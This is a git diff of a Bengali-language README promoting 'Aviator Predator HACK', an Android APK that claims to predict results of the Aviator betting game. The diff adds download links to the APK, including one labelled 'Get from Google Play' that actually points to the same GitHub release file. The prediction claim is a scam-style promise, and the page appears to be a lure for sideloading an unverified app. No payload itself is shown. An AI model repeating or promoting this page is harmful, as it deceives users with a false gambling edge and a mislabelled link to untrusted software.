@@ -1,5 +1,10 @@
 # Aviator Predator HACK 🚀
-![Aviator Predator HACK লোগো](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/blob/main/banner.jpeg)
+![Aviator Predator HACK](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/blob/main/banner.jpeg)
+
+[![ডাউনলোড](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/blob/main/dw.png)](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/releases/download/V7.0/aviator_pedictor.apk)
+
+- [APK ডাউনলোড (v7.0.0)](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/releases/download/V7.0/aviator_pedictor.apk)
+- [Google Play থেকে পান](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/releases/download/V7.0/aviator_pedictor.apk)
 
 স্বাগতম **Aviator Predator HACK** এ! এটি একটি অ্যান্ড্রয়েড অ্যাপ, যা Aviator গেমের স্কোর পূর্বাভাস করতে সহায়তা করে। এই অ্যাপটি উন্নত অ্যালগরিদম ব্যবহার করে গেমের ফলাফল পূর্বানুমান করতে পারে এবং আপনাকে এগিয়ে রাখে।
 
@@ -17,10 +22,10 @@
 ## 📥 ডাউনলোড
 নিচের লিঙ্ক থেকে **Aviator Predator HACK** এর সর্বশেষ সংস্করণটি আপনার অ্যান্ড্রয়েড ডিভাইসে ডাউনলোড করুন:
 
-[![ডাউনলোড](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/blob/main/dw.png)](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/raw/refs/heads/main/aviator_pedictor.apk)
+[![ডাউনলোড](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/blob/main/dw.png)](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/releases/download/V7.0/aviator_pedictor.apk)
 
-- [APK ডাউনলোড (v7.0.0)](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/raw/refs/heads/main/aviator_pedictor.apk)
-- [Google Play থেকে পান](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/raw/refs/heads/main/aviator_pedictor.apk)
+- [APK ডাউনলোড (v7.0.0)](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/releases/download/V7.0/aviator_pedictor.apk)
+- [Google Play থেকে পান](https://github.com/MakeItorTakeIt/Aviator-Predator-HACK/releases/download/V7.0/aviator_pedictor.apk)
 
 ## 🛠️ ইনস্টলেশন
 APK ইনস্টল করতে:
